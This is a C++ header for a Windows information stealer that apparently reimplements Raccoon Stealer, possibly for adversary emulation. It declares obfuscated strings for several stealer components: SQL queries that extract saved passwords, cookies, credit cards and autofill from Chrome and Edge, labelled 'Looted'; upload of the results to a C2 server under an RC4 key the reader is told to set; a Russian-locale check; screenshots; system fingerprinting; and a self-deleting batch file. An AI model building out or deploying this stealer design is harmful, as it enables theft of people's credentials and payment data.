#pragma once
#include <windows.h>
#include <string>

using namespace std;

#define FILES 0
#define DIRECTORIES 1

// String deobfuscation functions
int decryptGlobalStrings();

/* Globals */
// Basic config items -- You'll want to change these
extern const wchar_t g_C2RC4Key[]; // This is the key for C2 server decryption, same as the key in the server config.
extern const char g_StrRC4Key[]; // This is the key for string decrytion
extern wstring g_localLowPath;
extern wstring g_stagingFolder;
extern wstring g_server;
extern int g_port;

// File search options
extern const int PATH;
extern const int FILTER;
extern const int EXCLUSIONS;
extern const int MAX_FILE_SIZE;
extern const int RECURSE;

// Other globals
extern wstring g_token;
extern HANDLE g_hMutex;

// Some single character strings
extern wstring g_spaceChar; // L" "
extern wstring g_leftParen; // L"("
extern wstring g_rightParen; // L")"
extern wstring g_newLineChar; // L"/n"
extern wstring g_backSlash; // L"\\"
extern wstring g_forwardSlash; // L"/"
extern wstring g_quote; // L"\""
extern wstring g_asterisk; // L'*'
extern wstring g_asteriskWithSlash; // L"\\\*"
extern wstring g_dot; // L"."
extern wstring g_doubleDot; // L".."
extern wstring g_pipe; // L"|";
extern wstring g_dash; // L"-"
extern wstring g_comma; // L","

// System privs check
extern wstring g_sid; //L"S-1-5-18";

// Browser dump
extern wstring g_defaultWebData; //L"Default\\Web Data";
extern wstring g_webdata; //L"\\WebData";
extern wstring g_defaultLoginData; //L"Default\\Login Data";
extern wstring g_LoginData; //L"\\LoginData";
extern wstring g_defaultNetworkCookies; //L"Default\\Network\\Cookies";
extern wstring g_cookies; //L"\\Cookies";
extern wstring g_sqlite3_column_blob; // L"sqlite3_column_blob";
extern wstring g_sqlite3_open; // L"sqlite3_open";
extern wstring g_sqlite3_prepare_v2; // L"sqlite3_prepare_v2";
extern wstring g_sqlite3_finalize; // L"sqlite3_finalize";
extern wstring g_sqlite3_close; // L"sqlite3_close";
extern wstring g_sqlite3_step; // L"sqlite3_step";
extern wstring g_sqlite3_column_bytes; // L"sqlite3_column_bytes";
extern wstring g_sqlite3_column_text; // L"sqlite3_column_text";
extern wstring g_sqlite3_errmsg; // L"sqlite3_errmsg";
extern wstring g_localState; // L"Local State";
extern wstring g_encrypted_key; // L"encrypted_key";
extern wstring g_select_from_logins; // L"SELECT origin_url, username_value, password_value FROM logins";
extern wstring g_looted_logins; // L"Looted Logins : \n";
extern wstring g_append_url; // L"    URL: ";
extern wstring g_append_username; // L", Username: ";
extern wstring g_append_password; // L", Password:";
extern wstring g_select_from_cookies; // L"SELECT host_key, name, encrypted_value FROM cookies;";
extern wstring g_looted_cookies; // L"Looted Cookies:\n";
extern wstring g_append_hostkey; // L"    HostKey: ";
extern wstring g_append_name; // L", Name: ";
extern wstring g_append_value; // L", Value: ";
extern wstring g_select_from_credit_cards; // L"SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;";
extern wstring g_append_name_2; // L"    Name: ";
extern wstring g_append_expiration ; // L", Expiration: ";
extern wstring g_append_cc;// L", CC#: ";
extern wstring g_select_from_autofill; // L"SELECT name, value FROM autofill;";
extern wstring g_looted_ccs; // L"Looted CCs:\n";
extern wstring g_looted_autofill; // L"Looted Autofill:\n";
extern wstring g_sqlitedll; // L"\\sqlite3.dll";
extern wstring g_google_chrome_user_data; // L"\\Google\\Chrome\\User Data\\";
extern wstring g_chrome; // L"---Chrome---\n";
extern wstring g_microsoft_edge_user_data; // L"\\Microsoft\\Edge\\User Data\\";
extern wstring g_edge; // L"---Edge---\n";
extern wstring g_browser_theft; // L"BrowserTheft.txt";

// File up/download
extern wstring g_content_disposition ; // L"Content-Disposition: form-data; name=\"file\"; filename=\"";
extern wstring g_content_type; // L"Content-Type: application/x-object\n";
extern wstring g_content_type_2; // L"Content-Type: multipart/form-data; boundary=\"";
extern wstring g_cache_control; // L"\nCache-Control: no-cache";
extern wstring g_POST; // L"POST";
extern wstring g_recieved; // L"recieved";
extern wstring g_GET; // L"GET";
extern wstring g_userAgent; // L"arstRaccoonarst"
extern wstring g_doubleDash; // L"--"


// Initial checks and checkin
extern wstring g_mutexValue; // L"8724643052";
extern wstring g_ru_lang; // L"ru-ru";
extern wstring g_checkin_machineID ; // L"machineId=";
extern wstring g_checkin_configID ; // L"&configId=";
extern wstring g_checkin_headers; // L"Content-Type: application/x-ww-form-urlencoded; charset=utf-8\nCache-Control: no-cache";
extern wstring g_reg_open_Cryptography; // L"SOFTWARE\\Microsoft\\Cryptography";
extern wstring g_reg_query_MachineGUID; // L"MachineGuid";

// Config parsing
extern wstring g_config_libs_regex; // L"libs_.*$";
extern wstring g_config_grbr_regex ; // L"grbr_.*$";
extern wstring g_config_scrnsht_regex; // L"scrnsht_.*$";
extern wstring g_config_token_regex; // L"token:.*$";
extern wstring g_config_libs; // L"libs";
extern wstring g_config_grbr ; // L"grbr";
extern wstring g_config_scrnsht; // L"scrnsht";
extern wstring g_config_token;// L"token";
extern wstring g_clsid; // L"{557cf401-1a04-11d3-9a73-0000f81ef32e}";
extern wstring g_hastalavista; // L"\\hastalavista.bat";
extern wstring g_recyclebin; // L"C:\\$Recycle.Bin\\";
extern wstring g_exe; // L"\\*.exe";
extern wstring g_folderShortcutParser; // L"%\\w+%"
extern wstring g_userProfile; // L"USERPROFILE"
extern wstring g_publicPath; // L"C:\\users\\public"

// Bat file contents
extern wstring g_batPartOne;
extern wstring g_batPartTwo;
extern wstring g_batPartThree;
extern wstring g_batPartFour;

// Screenshot
extern wstring g_ScreenshotPath; // L"\\Screenshot.jpeg"
extern wstring g_screenshotUploadName; // L"---Screenshot.jpeg"

// Fingerprint
extern wstring g_systemInfoFilePath;
extern wstring g_systemInfoUploadName;
extern wstring g_xChar; // L"x"
extern wstring g_x86; // L"x86"
extern wstring g_x64; // L"x64"
extern wstring g_MB; // L" MB"
extern wstring g_unknownLiteral; // L"Unknown"
extern wstring g_osError; // L"OS Not Obtained"
extern wstring g_regCurrentVersion; // L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
extern wstring g_productNameKey; // L"ProductName"
extern wstring g_processorError; // L"Unable to obtain processor info"
extern wstring g_coresWithParen; // L"Cores)"
extern wstring g_localeError; //L"Unable to obtain locale"
extern wstring g_regUninstall; // L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
extern wstring g_displayNameKey; // L"DisplayName"
extern wstring g_displayVersionKey; // L"DisplayVersion"

///// system information block for formatting
extern wstring g_indent; // L"\t- "
extern wstring g_indent2; // L"\t\t"
extern wstring g_systemInfoFormat; // L"System Information:"
extern wstring g_localeFormat; // L"Locale: "
extern wstring g_timeZoneFormat; // L"Time zone: "
extern wstring g_archFormat; // L"Architecture: "
extern wstring g_cpuFormat; // L"CPU: "
extern wstring g_ramFormat; // L"RAM: "
extern wstring g_displaySizeFormat; // L"Display size: "
extern wstring g_displayDevicesFormat; // L"Display Devices:"
extern wstring g_installedAppsFormat; // L"Installed applications:"

// Browser theft fake data for exfil over http
extern wstring g_browserTheft;